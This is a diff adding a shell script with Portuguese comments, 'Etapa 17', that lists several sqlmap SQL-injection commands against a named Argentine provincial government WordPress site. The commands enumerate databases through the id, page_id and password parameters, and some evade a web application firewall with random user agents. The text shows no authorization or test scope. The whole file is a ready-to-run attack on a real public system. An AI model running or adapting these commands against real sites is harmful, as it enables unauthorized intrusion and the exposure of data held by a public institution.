@@ -1,0 +1,33 @@
+# ============================================
+# ETAPA 17: SQL INJECTION TESTING
+# Comandos sqlmap com output no terminal E arquivo
+# Usando 'tee' para ver progresso em tempo real
+# ============================================
+
+# Comando 1: Testar endpoint específico com parâmetro id (COM TEE - VER PROGRESSO)
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?id=1" --batch --dbs 2>&1 | tee etapa17_sqlmap_id.txt
+
+# Comando 2: Testar endpoint com parâmetro page_id (COM TEE)
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?page_id=1" --batch --dbs 2>&1 | tee etapa17_sqlmap_page_id.txt
+
+# Comando 3: Testar com parâmetro password (COM TEE)
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?password=test" --batch --dbs 2>&1 | tee etapa17_sqlmap_password.txt
+
+# Comando 4: Testar com evasão de WAF (COM TEE)
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?id=1" --batch --dbs --random-agent 2>&1 | tee etapa17_sqlmap_random_agent.txt
+
+# Comando 5: Testar com delay (COM TEE)
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?id=1" --batch --dbs --delay=2 2>&1 | tee etapa17_sqlmap_delay.txt
+
+# ============================================
+# ALTERNATIVA: SEM TEE (apenas arquivo, mais rápido)
+# ============================================
+
+# Comando 6: Testar endpoint específico (SEM TEE - apenas arquivo)
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?id=1" --batch --dbs > etapa17_sqlmap_id_silent.txt 2>&1
+
+# ============================================
+# COMANDO RECOMENDADO (COM TEE - VER PROGRESSO):
+# ============================================
+python /c/Sec/Tools/sqlmap/sqlmap.py -u "https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/posts/106992?id=1" --batch --dbs 2>&1 | tee etapa17_sqlmap_id.txt
+
